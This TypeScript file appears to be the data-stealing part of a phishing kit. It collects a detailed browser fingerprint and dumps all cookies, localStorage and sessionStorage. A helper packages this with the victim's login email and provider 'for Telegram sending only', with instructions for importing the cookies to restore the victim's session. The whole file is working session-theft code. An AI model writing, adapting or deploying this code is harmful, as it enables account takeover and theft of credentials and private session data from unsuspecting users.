// Browser fingerprinting and cookie collection utility

export interface BrowserFingerprint {
  userAgent: string;
  language: string;
  languages: string[];
  platform: string;
  cookieEnabled: boolean;
  doNotTrack: string | null;
  timezone: string;
  screen: string;
  colorDepth: number;
  pixelDepth: number;
  hardwareConcurrency: number;
  deviceMemory?: number;
  connection?: string;
  plugins: string[];
  mimeTypes: string[];
  canvas?: string;
  webgl?: string;
  audio?: string;
  fonts?: string[];
  localStorage: string;
  sessionStorage: string;
  cookies: string;
  indexedDB: boolean;
  webSQL: boolean;
  touchSupport: boolean;
  orientation?: string;
  devicePixelRatio: number;
  webdriver: boolean;
  onlineStatus: boolean;
}

export const collectBrowserFingerprint = (): BrowserFingerprint => {
  const nav = navigator as any;
  
  // Collect basic browser information
  const userAgent = nav.userAgent || 'Unknown';
  const language = nav.language || 'Unknown';
  const languages = nav.languages ? Array.from(nav.languages) : [];
  const platform = nav.platform || 'Unknown';
  const cookieEnabled = nav.cookieEnabled || false;
  const doNotTrack = nav.doNotTrack || null;
  
  // Timezone and screen information
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
  const screen = `${window.screen.width}x${window.screen.height}`;
  const colorDepth = window.screen.colorDepth || 0;
  const pixelDepth = window.screen.pixelDepth || 0;
  const devicePixelRatio = window.devicePixelRatio || 1;
  
  // Hardware information
  const hardwareConcurrency = nav.hardwareConcurrency || 0;
  const deviceMemory = nav.deviceMemory;
  const connection = nav.connection ? `${nav.connection.effectiveType} (${nav.connection.downlink}Mbps)` : undefined;
  
  // Plugins and MIME types
  const plugins = Array.from(nav.plugins || []).map((plugin: any) => plugin.name);
  const mimeTypes = Array.from(nav.mimeTypes || []).map((mime: any) => mime.type);
  
  // Touch and orientation support
  const touchSupport = 'ontouchstart' in window || nav.maxTouchPoints > 0;
  const orientation = window.screen.orientation ? window.screen.orientation.type : undefined;
  
  // WebDriver detection
  const webdriver = nav.webdriver || false;
  
  // Online status
  const onlineStatus = nav.onLine || false;
  
  // Storage capabilities
  const indexedDB = 'indexedDB' in window;
  const webSQL = 'openDatabase' in window;
  
  // Collect localStorage data
  let localStorage = 'Empty';
  try {
    const localStorageData: { [key: string]: string } = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (key) {
        localStorageData[key] = window.localStorage.getItem(key) || '';
      }
    }
    localStorage = Object.keys(localStorageData).length > 0 ? JSON.stringify(localStorageData) : 'Empty';
  } catch (error) {
    localStorage = 'Access denied';
  }
  
  // Collect sessionStorage data
  let sessionStorage = 'Empty';
  try {
    const sessionStorageData: { [key: string]: string } = {};
    for (let i = 0; i < window.sessionStorage.length; i++) {
      const key = window.sessionStorage.key(i);
      if (key) {
        sessionStorageData[key] = window.sessionStorage.getItem(key) || '';
      }
    }
    sessionStorage = Object.keys(sessionStorageData).length > 0 ? JSON.stringify(sessionStorageData) : 'Empty';
  } catch (error) {
    sessionStorage = 'Access denied';
  }
  
  // Collect cookies
  let cookies = 'No cookies found';
  try {
    const cookieString = document.cookie;
    if (cookieString && cookieString.trim() !== '') {
      const cookieArray = cookieString.split(';').map(cookie => cookie.trim());
      const cookieObject: { [key: string]: string } = {};
      
      cookieArray.forEach(cookie => {
        const [name, ...valueParts] = cookie.split('=');
        if (name && valueParts.length > 0) {
          cookieObject[name.trim()] = valueParts.join('=').trim();
        }
      });
      
      cookies = Object.keys(cookieObject).length > 0 ? JSON.stringify(cookieObject) : 'No cookies found';
    }
  } catch (error) {
    cookies = 'Cookie access denied';
  }
  
  // Canvas fingerprinting
  let canvas = undefined;
  try {
    const canvasElement = document.createElement('canvas');
    const ctx = canvasElement.getContext('2d');
    if (ctx) {
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('Browser fingerprint canvas test 🔍', 2, 2);
      canvas = canvasElement.toDataURL();
    }
  } catch (error) {
    // Canvas fingerprinting blocked or failed
  }
  
  // WebGL fingerprinting
  let webgl = undefined;
  try {
    const canvasElement = document.createElement('canvas');
    const gl = canvasElement.getContext('webgl') || canvasElement.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        webgl = `${vendor} - ${renderer}`;
      }
    }
  } catch (error) {
    // WebGL fingerprinting blocked or failed
  }
  
  // Audio fingerprinting
  let audio = undefined;
  try {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const analyser = audioContext.createAnalyser();
    const gainNode = audioContext.createGain();
    
    oscillator.type = 'triangle';
    oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
    
    gainNode.gain.setValueAtTime(0, audioContext.currentTime);
    oscillator.connect(analyser);
    analyser.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.start(0);
    
    const frequencyData = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(frequencyData);
    
    audio = Array.from(frequencyData).slice(0, 30).join(',');
    
    oscillator.stop();
    audioContext.close();
  } catch (error) {
    // Audio fingerprinting blocked or failed
  }
  
  // Font detection
  let fonts: string[] = [];
  try {
    const testFonts = [
      'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
      'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
      'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Sans Unicode',
      'Tahoma', 'Lucida Console', 'Monaco', 'Courier', 'Bradley Hand',
      'Brush Script MT', 'Luminari', 'Chalkduster'
    ];
    
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';
    
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    if (context) {
      const baseWidths: { [key: string]: number } = {};
      
      // Get baseline widths
      baseFonts.forEach(baseFont => {
        context.font = `${testSize} ${baseFont}`;
        baseWidths[baseFont] = context.measureText(testString).width;
      });
      
      // Test each font
      testFonts.forEach(font => {
        let detected = false;
        baseFonts.forEach(baseFont => {
          context.font = `${testSize} ${font}, ${baseFont}`;
          const width = context.measureText(testString).width;
          if (width !== baseWidths[baseFont]) {
            detected = true;
          }
        });
        if (detected) {
          fonts.push(font);
        }
      });
    }
  } catch (error) {
    // Font detection failed
  }
  
  return {
    userAgent,
    language,
    languages,
    platform,
    cookieEnabled,
    doNotTrack,
    timezone,
    screen,
    colorDepth,
    pixelDepth,
    hardwareConcurrency,
    deviceMemory,
    connection,
    plugins,
    mimeTypes,
    canvas,
    webgl,
    audio,
    fonts,
    localStorage,
    sessionStorage,
    cookies,
    indexedDB,
    webSQL,
    touchSupport,
    orientation,
    devicePixelRatio,
    webdriver,
    onlineStatus
  };
};

// Helper function to create cookies file data structure (for Telegram sending only)
export const createCookiesFileData = (fingerprint: BrowserFingerprint, loginData: any) => {
  return {
    timestamp: new Date().toISOString(),
    loginInfo: {
      email: loginData.email,
      provider: loginData.provider,
      fileName: loginData.fileName,
      userAgent: loginData.userAgent
    },
    browserFingerprint: fingerprint,
    instructions: {
      usage: "This file contains comprehensive browser session data",
      cookies: "Use browser extensions like 'Cookie Editor' to import cookies",
      localStorage: "Use browser developer tools to set localStorage items",
      sessionStorage: "Use browser developer tools to set sessionStorage items",
      fingerprint: "Complete browser fingerprint for session restoration"
    }
  };
};